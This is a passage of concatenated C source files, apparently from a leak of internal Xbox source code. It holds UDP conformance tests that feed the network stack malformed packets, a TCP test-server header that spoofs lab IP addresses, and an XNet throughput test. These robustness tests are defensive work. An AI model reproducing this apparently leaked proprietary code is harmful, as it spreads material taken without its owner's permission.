// Description: Test that receives a UDP packet on the minimum port number
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPDestMinTest(WORD LowPort, WORD HighPort)
{
	return ReceiveUDPPacket(1, LowPort, 0, FALSE);
}

//==================================================================================
// UDPDestZeroTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet on port number zero
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPDestZeroTest(WORD LowPort, WORD HighPort)
{
	// There's no way to bind to port zero.
	// We're really just seeing if the stack blows up
	Sleep(5000);
	return TRUE;
}

//==================================================================================
// UDPLenBelowMinTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet with a length below the minimum
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenBelowMinTest(WORD LowPort, WORD HighPort)
{
	// The packet we're receiving shouldn't work...
	// We're really just seeing if the stack blows up
	return !ReceiveUDPPacket(LowPort, LowPort, 0, FALSE);
}

//==================================================================================
// UDPLenAtMinTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet with a length of exactly the minimum
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenAtMinTest(WORD LowPort, WORD HighPort)
{
	return ReceiveUDPPacket(LowPort, LowPort, 0, TRUE);
}

//==================================================================================
// UDPLenAboveMinTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet with a length above the minimum
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenAboveMinTest(WORD LowPort, WORD HighPort)
{
	return ReceiveUDPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// UDPLenAboveTotalTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet with a length above total bytes in packet
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenAboveTotalTest(WORD LowPort, WORD HighPort)
{
	// The packet we're receiving shouldn't work...
	// We're really just seeing if the stack blows up
	return !ReceiveUDPPacket(LowPort, LowPort, 0, FALSE);
}

//==================================================================================
// UDPLenBelowTotalTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet with a length below the total bytes in packet
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenBelowTotalTest(WORD LowPort, WORD HighPort)
{
	// This packet should actually work, the extra byte should be thrown away and not received
	return ReceiveUDPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// UDPLenMaxTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet with maximum length
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenMaxTest(WORD LowPort, WORD HighPort)
{
	// This packet will probably be discarded because it's too long.
	// But at least check to make sure it doesn't break the stack.
	return ReceiveUDPPacket(LowPort, LowPort, 1472, TRUE);
}

//==================================================================================
// UDPCheckOnesTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet with a valid checksum of all ones
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPCheckOnesTest(WORD LowPort, WORD HighPort)
{
	return ReceiveUDPPacket(LowPort, LowPort, 0, FALSE);
}

//==================================================================================
// UDPCheckZerosTest
//----------------------------------------------------------------------------------
//
// Description: Test that receives a UDP packet with a checksum of all zeros (indicating not computed)
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPCheckZerosTest(WORD LowPort, WORD HighPort)
{
	// Supposedly we should keep the packet if there is no checksum
	return ReceiveUDPPacket(LowPort, LowPort, 0, FALSE);
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\tcp\server\tcpserv.h ===
#ifndef __TCPSERV_H__
#define __TCPSERV_H__

//==================================================================================
// Includes
//==================================================================================

#include <netsync.h>
#include "tcpmsg.h"
#include "spartaapi.h"

//==================================================================================
// Defines
//==================================================================================

#define	MSS_DEFAULT	1460

// This might need to be changed from time to time if another host is added
// to the subnet with the same address or if the test lab moves to another subnet
#define LOCAL_SPOOF_IP_BASE_STRING TEXT("157.56.11.")

// This is the base host that we will spoof as
// We will loop around at 254, giving us support for 4 simultaneous hosts
#define LOCAL_SPOOF_IP_BASE_HOST 250

//==================================================================================
// Typedefs
//==================================================================================

// Session info structure
typedef struct _SESSION_INFO
{
	CInterfaceList *pInterfaceList;
	CInterface *pInterface;
	CAutoArp *pAutoArp;
    CPattern *pProtocolPattern;
    CPattern *pDestAddrPattern;
    CPattern *pSrcIpPattern;
    CPattern *pDestIpPattern;
    CPattern *pProtocolIpPattern;
	HANDLE hNetsyncObject;
	BYTE byClientCount;
	DWORD *ClientAddrs;
	WORD LowPort;
	WORD HighPort;
	CHAR szServerIPAddr[16];
	CHAR szClientIPAddr[16];
	PTCP_TESTREQ pCurrentRequest;
} SESSION_INFO, *PSESSION_INFO;

// TCP test function type
typedef BOOL (*PTCP_SERV_FUNCTION) (DWORD FromAddr, PSESSION_INFO pSessionInfo);

//==================================================================================
// Prototypes 
//==================================================================================

// Test case functions
BOOL TCPSeqNumMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPSeqNumMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPDataOffBelowMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPDataOffAboveAvailServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
#if 0
BOOL TCPReservedSetServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPWindowMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPWindowMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPChecksumBadServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPUrgentAfterEndServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPUrgentAtEndServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPUrgentBeforeEndServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPUrgentMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPUrgentNoFlagServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPOptCutoffServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPOptAtEndServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPOptBeforeEndServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPOptNoOptsServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPOptMaxOptsServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPOptMaxOptLenServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPOptEndOfOptsServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPOptMssZeroServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPOptMssOneServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPOptMssMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPConnSynAndNoAckServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPConnExtraSynServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPConnAckWrongSynServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPConnSynAckWrongSynServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPConnAckNoConnServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPConnSynAckListenerServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL TCPShutFinAndNoAckServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
#endif

#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\udp\client\udptest.h ===
#ifndef __UDPTEST_H__
#define __UDPTEST_H__

//==================================================================================
// Includes
//==================================================================================
#include <nt.h>
#include <ntrtl.h>
#include <nturtl.h>
#include <xtl.h>
#include <xnetref.h>
#include <xlog.h>
#include <xtestlib.h>
#include <netsync.h>
#include <xlog.h>
#include <xboxp.h>
#include <stdio.h>

#include "udpmsg.h"

//==================================================================================
// Defines
//==================================================================================
#define UDP_SERVER_DLL_W L"udpserv.dll"
#define UDP_SERVER_MAIN_FUNCTION_A "UdpServerCallbackFunction"
#define UDP_SERVER_START_FUNCTION_A "UdpServerStartFunction"
#define UDP_SERVER_STOP_FUNCTION_A "UdpServerStopFunction"

#define MAX_REQUEST_RETRIES 5
#define RETRY_TIMEOUT 3000
#define TIME_INFINITY 10000

//==================================================================================
// Typedefs
//==================================================================================

// UDP test function
typedef BOOL (*PUDP_TEST_FUNCTION)(WORD LowPort, WORD HighPort);

// States that sockets can be monitored for
typedef enum _SOCKET_STATE
{
	READABLE,
	WRITEABLE,
	EXCEPTION
} SOCKET_STATE;

//==================================================================================
// Prototypes 
//==================================================================================
// Harness functions
BOOL WINAPI UdpTestDllMain(IN HINSTANCE hInstance, IN DWORD dwReason, IN LPVOID lpContext);
VOID WINAPI UdpTestStartTest(IN HANDLE hLog);
VOID WINAPI UdpTestEndTest();

// Test case functions
BOOL UDPSourceMaxTest (WORD LowPort, WORD HighPort);
BOOL UDPSourceMinTest (WORD LowPort, WORD HighPort);
BOOL UDPSourceZeroTest (WORD LowPort, WORD HighPort);
BOOL UDPDestMaxTest (WORD LowPort, WORD HighPort);
BOOL UDPDestMinTest (WORD LowPort, WORD HighPort);
BOOL UDPDestZeroTest (WORD LowPort, WORD HighPort);
BOOL UDPLenBelowMinTest (WORD LowPort, WORD HighPort);
BOOL UDPLenAtMinTest (WORD LowPort, WORD HighPort);
BOOL UDPLenAboveMinTest (WORD LowPort, WORD HighPort);
BOOL UDPLenAboveTotalTest (WORD LowPort, WORD HighPort);
BOOL UDPLenBelowTotalTest (WORD LowPort, WORD HighPort);
BOOL UDPLenMaxTest (WORD LowPort, WORD HighPort);
BOOL UDPCheckOnesTest (WORD LowPort, WORD HighPort);
BOOL UDPCheckZerosTest (WORD LowPort, WORD HighPort);

#endif // __UDPTEST_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\winsock\perf\precomp.h ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

    precomp.h

Abstract:

    Pre-compiled header file

Author:

    Steven Kehrli (steveke) 23-Oct-2001

Environment:

    XBox

Revision History:

------------------------------------------------------------------------------*/

#include <nt.h>
#include <ntrtl.h>
#include <nturtl.h>
#include <xtl.h>
#include <stdio.h>
#include <ntos.h>

#include <xmem.h>

#include "util.h"
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\winsock\perf\main.c ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

  main.c

Abstract:

  This module tests XNet performance

Author:

  Steven Kehrli (steveke) 17-Nov-2001

Environment:

  XBox

Revision History:

------------------------------------------------------------------------------*/

#include "precomp.h"



#define PORT_SESSION              65475
#define PORT_UDP                  65476
#define PORT_TCP                  65476



typedef struct _SETUP_TABLE {
    LPSTR  lpszSecurityName;
    BYTE   cfgFlags;
    BOOL   bSecure;
    INT    nTCPOverhead;
    INT    nUDPOverhead;
} SETUP_TABLE, *PSETUP_TABLE;

static SETUP_TABLE SetupTable[] = {
    { "None", XNET_STARTUP_BYPASS_SECURITY,   FALSE, 66,  54 },
    { "Full", 0,                              TRUE,  104, 92 }
};

#define SetupTableCount (sizeof(SetupTable) / sizeof(SETUP_TABLE))



#define ITERATIONS_DEFAULT        10

#define BANDWIDTH_MIN             32
#define BANDWIDTH_DEFAULT         64
#define BANDWIDTH_MAX             51208



#define SESSION_ID_LEN            8

#define SESSION_ENUM_MSG          1
#define SESSION_ENUM_REPLY        2
#define SESSION_CONNECT_MSG       3
#define SESSION_CONNECT_REPLY     4
#define SESSION_READY_MSG         5
#define SESSION_READY_REPLY       6



typedef struct _SESSION_OBJECT {
    HANDLE                hMemObject;                  // Handle to the memory object
    XNADDR                LocalXnAddr;                 // Specifies the local xnet addr
    SOCKET                sSessionSocket;              // Specifies the session socket descriptor
    const static u_short  SessionPort = PORT_SESSION;  // Specifies the session port
    SOCKET                sUDPSocket;                  // Specifies the UDP socket descriptor
    const static u_short  UDPPort = PORT_UDP;          // Specifies the UDP port
    SOCKET                sTCPConnectSocket;           // Specifies the TCP socket descriptor for connect
    SOCKET                sTCPAcceptSocket;            // Specifies the TCP socket descriptor for accept
    const static u_short  TCPPort = PORT_TCP;          // Specifies the TCP port
    XNKID                 XnKid;                       // Specifies the xnet key id
    XNKEY                 XnKey;                       // Specifies the xnet key
    BOOL                  bXnKey;                      // Specifies if an xnet key id and key are registered
    BYTE                  SessionId[SESSION_ID_LEN];   // Specifies the session id
    u_long                RemoteAddr;                  // Specifies the remote address
    INT                   nBandwidth;                  // Specifies the bandwidth usage
    INT                   nTCPOverhead;                // Specifies the TCP overhead
    INT                   nUDPOverhead;                // Specifies the UDP overhead
} SESSION_OBJECT, *PSESSION_OBJECT;

typedef struct _SESSION_MESSAGE {
    DWORD                 dwMessageId;                 // Specifies the message id
    INT                   nSetup;                      // Specifies the current test setup
    BYTE                  SessionId[SESSION_ID_LEN];   // Specifies the session id
    XNADDR                FromXnAddr;                  // Specifies the xnet addr of the sender
    XNKID                 XnKid;                       // Specifies the xnet key id
    XNKEY                 XnKey;                       // Specifies the xnet key
    INT                   nBandwidth;                  // Specifies the bandwidth usage
} SESSION_MESSAGE, *PSESSION_MESSAGE;



#define SEND_TIME                 60
#define BUFFER_KBYTES_ACK_SIZE    63
#define BUFFER_BYTES_ACK_SIZE     1024 * BUFFER_KBYTES_ACK_SIZE



typedef struct _TEST_TABLE {
    LPSTR                 lpszTestName;                // Specifies the test name
    int                   type;                        // Specifies the type of socket
    int                   len;                         // Specifies the length of the buffer
} TEST_TABLE, *PTEST_TABLE;

static TEST_TABLE TestTable[] = {
    { "TCP 38 Bytes",   SOCK_STREAM, 38   },
    { "TCP 70 Bytes",   SOCK_STREAM, 70   },
    { "TCP 134 Bytes",  SOCK_STREAM, 134  },
    { "TCP 262 Bytes",  SOCK_STREAM, 262  },
    { "TCP 390 Bytes",  SOCK_STREAM, 390  },
    { "TCP 518 Bytes",  SOCK_STREAM, 518  },
    { "TCP 646 Bytes",  SOCK_STREAM, 646  },
    { "TCP 774 Bytes",  SOCK_STREAM, 774  },
    { "TCP 902 Bytes",  SOCK_STREAM, 902  },
    { "TCP 1030 Bytes", SOCK_STREAM, 1030 },
    { "UDP 38 Bytes",   SOCK_DGRAM,  38   },
    { "UDP 70 Bytes",   SOCK_DGRAM,  70   },
    { "UDP 134 Bytes",  SOCK_DGRAM,  134  },
    { "UDP 262 Bytes",  SOCK_DGRAM,  262  },
    { "UDP 390 Bytes",  SOCK_DGRAM,  390  },
    { "UDP 518 Bytes",  SOCK_DGRAM,  518  },
    { "UDP 646 Bytes",  SOCK_DGRAM,  646  },
    { "UDP 774 Bytes",  SOCK_DGRAM,  774  },
    { "UDP 902 Bytes",  SOCK_DGRAM,  902  },
    { "UDP 1030 Bytes", SOCK_DGRAM,  1030 },
};

#define TestTableCount (sizeof(TestTable) / sizeof(TEST_TABLE))



INT
CalculatePayloadTotal(
    IN INT  nBandwidth,
    IN INT  nPayload,
    IN INT  nOverhead
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Calculates the total payload

Arguments:

  nBandwidth - Specifies the bandwidth usage
  nPayload - Specifies the payload size
  nOverhead - Specifies the ethernet overhead size

Return Value:

  INT:
    If the function succeeds, the return value is the total payload
    If the function fails, the return value is 0.

------------------------------------------------------------------------------*/
{
    if (BANDWIDTH_MAX == nBandwidth) {
        nBandwidth = 102400;
    }

    return (((nBandwidth / 8) * 1024 * SEND_TIME) / (nPayload + nOverhead)) * nPayload;
}



INT
CalculateEthernetTotal(
    IN INT  nPayloadTotal,
    IN INT  nPayload,
    IN INT  nOverhead
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Calculates the total ethernet

Arguments:

  nPayloadTotal - Specifies the total payload
  nPayload - Specifies the payload size
  nOverhead - Specifies the ethernet overhead size

Return Value:

  INT:
    If the function succeeds, the return value is the total ethernet
    If the function fails, the return value is 0.

------------------------------------------------------------------------------*/
{
    return (nPayloadTotal / nPayload) * (nPayload + nOverhead);
}



DOUBLE
CalculateSendRate(
    IN INT  nBandwidth,
    IN INT  nPayload,
    IN INT  nOverhead
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Calculates the send rate

Arguments:

  nBandwidth - Specifies the bandwidth usage
  nPayload - Specifies the payload size
  nOverhead - Specifies the ethernet overhead size

Return Value:

  INT:
    If the function succeeds, the return value is the send rate
    If the function fails, the return value is 0.

------------------------------------------------------------------------------*/
{
    if (BANDWIDTH_MAX == nBandwidth) {
        return 0;
    }

    return (((DOUBLE) nBandwidth / 8) * 1024) / ((DOUBLE) nPayload + (DOUBLE) nOverhead);
}



SOCKET
CreateSocket(
    IN int     type,
    IN u_short sin_port,
    IN BOOL    bBroadcast
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Creates and binds a socket

Arguments:

  type - Specifies the type of socket (SOCK_DGRAM or SOCK_STREAM)
  sin_port - Specifies the bind port of socket
  bBroadcast - Specifies the broadcast mode of socket

Return Value:

  SOCKET:
    If the function succeeds, the return value is a socket descriptor
    If the function fails, the return value is INVALID_SOCKET.  To get extended error information, call GetLastError().

------------------------------------------------------------------------------*/
{
    // sSocket is the new socket
    SOCKET       sSocket = INVALID_SOCKET;
    // nTimeout is the timeout, in ms
    int          nTimeout = 15000;
    // localname is the local address
    SOCKADDR_IN  localname;
    // iErrorCode is the last error code
    int          iErrorCode = ERROR_SUCCESS;



    // Create the session socket
    sSocket = socket(AF_INET, type, 0);
    if (INVALID_SOCKET == sSocket) {
        // Get the last error code
        iErrorCode = WSAGetLastError();

        goto FunctionExit;
    }

    if ((TRUE == bBroadcast) && (SOCK_DGRAM == type)) {
        // Enable the control socket to send broadcast data
        if (SOCKET_ERROR == setsockopt(sSocket, SOL_SOCKET, SO_BROADCAST, (char *) &bBroadcast, sizeof(bBroadcast))) {
            // Get the last error code
            iErrorCode = WSAGetLastError();

            goto FunctionExit;
        }
    }

    // Set the timeout
    setsockopt(sSocket, SOL_SOCKET, SO_SNDTIMEO, (char *) &nTimeout, sizeof(nTimeout));
    setsockopt(sSocket, SOL_SOCKET, SO_RCVTIMEO, (char *) &nTimeout, sizeof(nTimeout));

    // Setup the local address
    ZeroMemory(&localname, sizeof(localname));
    localname.sin_family = AF_INET;
    localname.sin_port = htons(sin_port);

    // Bind the session socket
    if (SOCKET_ERROR == bind(sSocket, (SOCKADDR *) &localname, sizeof(localname))) {
        // Get the last error code
        iErrorCode = WSAGetLastError();

        goto FunctionExit;
    }

FunctionExit:
    if (ERROR_SUCCESS != iErrorCode) {
        if (INVALID_SOCKET != sSocket) {
            closesocket(sSocket);
            sSocket = INVALID_SOCKET;
        }

        SetLastError(iErrorCode);
    }

    return sSocket;
}



VOID
CloseSession(
    IN PSESSION_OBJECT  pSessionObject
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Closes a session

Arguments:

  pSessionObject - Pointer to the session object

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // hMemObject is a handle to the memory object
    HANDLE  hMemObject = pSessionObject->hMemObject;



    // Unregister the xnet key id and key
    if (TRUE == pSessionObject->bXnKey) {
        XNetUnregisterKey(&pSessionObject->XnKid);
    }

    // Close the TCP socket for accept
    if (INVALID_SOCKET != pSessionObject->sTCPAcceptSocket) {
        shutdown(pSessionObject->sTCPAcceptSocket, SD_BOTH);
        closesocket(pSessionObject->sTCPAcceptSocket);
    }

    // Close the TCP socket for connect
    if (INVALID_SOCKET != pSessionObject->sTCPConnectSocket) {
        shutdown(pSessionObject->sTCPConnectSocket, SD_BOTH);
        closesocket(pSessionObject->sTCPConnectSocket);
    }

    // Close the UDP socket
    if (INVALID_SOCKET != pSessionObject->sUDPSocket) {
        shutdown(pSessionObject->sUDPSocket, SD_BOTH);
        closesocket(pSessionObject->sUDPSocket);
    }

    // Close the session socket
    if (INVALID_SOCKET != pSessionObject->sSessionSocket) {
        shutdown(pSessionObject->sSessionSocket, SD_BOTH);
        closesocket(pSessionObject->sSessionSocket);
    }

    // Free the session object
    xMemFree(hMemObject, pSessionObject);

    // Close the memory object
    xMemClose(hMemObject);
}



PSESSION_OBJECT
CreateSession(
    IN INT  nBandwidth,
    IN INT  nTCPOverhead,
    IN INT  nUDPOverhead
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Create a session

Arguments:

  nBandwidth - Specifies the bandwidth usage
  nTCPOverhead - Specifies the TCP overhead
  nUDPOverhead - Specifies the UDP overhead

Return Value:

  PSESSION_OBJECT:
    If the function succeeds, the return value is a pointer to the session object.
    If the function fails, the return value is NULL.  To get extended error information, call GetLastError().

------------------------------------------------------------------------------*/
{
    // pSessionObject is a pointer to the session object
    PSESSION_OBJECT  pSessionObject = NULL;
    // hMemObject is a handle to the memory object
    HANDLE           hMemObject = INVALID_HANDLE_VALUE;
    // dwLastError is the last error code
    DWORD            dwLastError = ERROR_SUCCESS;



    // Create the memory object
    hMemObject = xMemCreate();
    if (INVALID_HANDLE_VALUE == hMemObject) {
        // Get the last error
        dwLastError = GetLastError();

        goto FunctionExit;
    }

    // Create the session object
    pSessionObject = (PSESSION_OBJECT) xMemAlloc(hMemObject, sizeof(SESSION_OBJECT));
    if (NULL == pSessionObject) {
        // Get the last error
        dwLastError = GetLastError();

        goto FunctionExit;
    }

    // Set the session object
    pSessionObject->hMemObject = hMemObject;
    pSessionObject->sSessionSocket = INVALID_SOCKET;
    pSessionObject->sUDPSocket = INVALID_SOCKET;
    pSessionObject->sTCPConnectSocket = INVALID_SOCKET;
    pSessionObject->sTCPAcceptSocket = INVALID_SOCKET;
    pSessionObject->RemoteAddr = INADDR_NONE;
    pSessionObject->nBandwidth = nBandwidth;
    pSessionObject->nTCPOverhead = nTCPOverhead;
    pSessionObject->nUDPOverhead = nUDPOverhead;

    // Get the local xnet addr
    while (0 == XNetGetTitleXnAddr(&pSessionObject->LocalXnAddr)) {
        Sleep(250);
    }

    // Create the session socket
    pSessionObject->sSessionSocket = CreateSocket(SOCK_DGRAM, pSessionObject->SessionPort, TRUE);
    if (INVALID_SOCKET == pSessionObject->sSessionSocket) {
        // Get the last error
        dwLastError = WSAGetLastError();

        goto FunctionExit;
    }

    // Create the UDP socket
    pSessionObject->sUDPSocket = CreateSocket(SOCK_DGRAM, pSessionObject->UDPPort, FALSE);
    if (INVALID_SOCKET == pSessionObject->sUDPSocket) {
        // Get the last error
        dwLastError = WSAGetLastError();

        goto FunctionExit;
    }

    // Create the TCP socket for connect
    pSessionObject->sTCPConnectSocket = CreateSocket(SOCK_STREAM, pSessionObject->TCPPort, FALSE);
    if (INVALID_SOCKET == pSessionObject->sTCPConnectSocket) {
        // Get the last error
        dwLastError = WSAGetLastError();

        goto FunctionExit;
    }

FunctionExit:
    if (ERROR_SUCCESS != dwLastError) {
        if (NULL != pSessionObject) {
            // Close the session object
            CloseSession(pSessionObject);
            pSessionObject = NULL;
        }

        // Set the last error code
        SetLastError(dwLastError);
    }

    return pSessionObject;
}



INT
HostSession(
    IN PSESSION_OBJECT  pSessionObject,
    IN INT              nSetup,
    IN BOOL             bSecure
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Hosts a session

Arguments:

  pSessionObject - Pointer to the session object
  nSetup - Specifies the current test setup
  bSecure - Specifies if session is secure

Return Value:

  INT:
    If the function succeeds, the return value is the bandwidth usage.

------------------------------------------------------------------------------*/
{
    // SessionMessageIn is a session message
    SESSION_MESSAGE  SessionMessageIn;
    // SessionMessageOut is a session message
    SESSION_MESSAGE  SessionMessageOut;
    // remotename is the remote address
    SOCKADDR_IN      remotename;
    // RemoteInAddr is the remote address
    IN_ADDR          RemoteInAddr;



    // Create and register the xnet key id and key
    XNetCreateKey(&pSessionObject->XnKid, &pSessionObject->XnKey);
    XNetRegisterKey(&pSessionObject->XnKid, &pSessionObject->XnKey);
    pSessionObject->bXnKey = TRUE;

    // Listen on TCP socket
    listen(pSessionObject->sTCPConnectSocket, SOMAXCONN);

    // Setup the remote address
    ZeroMemory(&remotename, sizeof(remotename));
    remotename.sin_family = AF_INET;
    remotename.sin_addr.s_addr = INADDR_BROADCAST;
    remotename.sin_port = htons(pSessionObject->SessionPort);

    do {
        // Receive enum message
        ZeroMemory(&SessionMessageIn, sizeof(SessionMessageIn));
        recvfrom(pSessionObject->sSessionSocket, (char *) &SessionMessageIn, sizeof(SessionMessageIn), 0, NULL, NULL);

        if ((SESSION_ENUM_MSG == SessionMessageIn.dwMessageId) && (nSetup == SessionMessageIn.nSetup)) {
            // Set the session message
            ZeroMemory(&SessionMessageOut, sizeof(SessionMessageOut));

            SessionMessageOut.dwMessageId = SESSION_ENUM_REPLY;
            SessionMessageOut.nSetup = nSetup;
            CopyMemory(SessionMessageOut.SessionId, SessionMessageIn.SessionId, sizeof(SessionMessageOut.SessionId));
            CopyMemory(&SessionMessageOut.FromXnAddr, &pSessionObject->LocalXnAddr, sizeof(SessionMessageOut.FromXnAddr));
            CopyMemory(&SessionMessageOut.XnKid, &pSessionObject->XnKid, sizeof(SessionMessageOut.XnKid));
            CopyMemory(&SessionMessageOut.XnKey, &pSessionObject->XnKey, sizeof(SessionMessageOut.XnKey));
            SessionMessageOut.nBandwidth = SessionMessageIn.nBandwidth;

            // Send the enum reply
            sendto(pSessionObject->sSessionSocket, (char *) &SessionMessageOut, sizeof(SessionMessageOut), 0, (SOCKADDR *) &remotename, sizeof(remotename));
        }
    } while (SESSION_CONNECT_MSG != SessionMessageIn.dwMessageId);

    // Resolve the remote name
    if (FALSE == bSecure) {
        RemoteInAddr = SessionMessageIn.FromXnAddr.ina;
    }
    else {
        XNetXnAddrToInAddr(&SessionMessageIn.FromXnAddr, &pSessionObject->XnKid, &RemoteInAddr);
    }

    // Setup the remote address
    ZeroMemory(&remotename, sizeof(remotename));
    remotename.sin_family = AF_INET;
    remotename.sin_addr = RemoteInAddr;
    remotename.sin_port = htons(pSessionObject->SessionPort);

    // Connect the session socket
    connect(pSessionObject->sSessionSocket, (SOCKADDR *) &remotename, sizeof(remotename));

    // Setup the remote address
    ZeroMemory(&remotename, sizeof(remotename));
    remotename.sin_family = AF_INET;
    remotename.sin_addr = RemoteInAddr;
    remotename.sin_port = htons(pSessionObject->UDPPort);

    // Connect the UDP connection
    connect(pSessionObject->sUDPSocket, (SOCKADDR *) &remotename, sizeof(remotename));

    // Accept the TCP connection
    pSessionObject->sTCPAcceptSocket = accept(pSessionObject->sTCPConnectSocket, NULL, NULL);

    // Set the bandwidth usage
    pSessionObject->nBandwidth = SessionMessageIn.nBandwidth;

    // Set the session message
    ZeroMemory(&SessionMessageOut, sizeof(SessionMessageOut));

    SessionMessageOut.dwMessageId = SESSION_CONNECT_REPLY;
    SessionMessageOut.nSetup = nSetup;
    CopyMemory(SessionMessageOut.SessionId, SessionMessageIn.SessionId, sizeof(SessionMessageOut.SessionId));
    CopyMemory(&SessionMessageOut.FromXnAddr, &pSessionObject->LocalXnAddr, sizeof(SessionMessageOut.FromXnAddr));

    // Send the connect reply
    send(pSessionObject->sSessionSocket, (char *) &SessionMessageOut, sizeof(SessionMessageOut), 0);

    // Return the remote addr
    pSessionObject->RemoteAddr = RemoteInAddr.s_addr;

    return pSessionObject->nBandwidth;
}



VOID
JoinSession(
    IN PSESSION_OBJECT  pSessionObject,
    IN INT              nSetup,
    IN BOOL             bSecure
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Joins a session

Arguments:

  pSessionObject - Pointer to the session object
  nSetup - Specifies the current test setup
  bSecure - Specifies if session is secure

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // SessionMessageIn is a session message
    SESSION_MESSAGE  SessionMessageIn;
    // SessionMessageOut is a session message
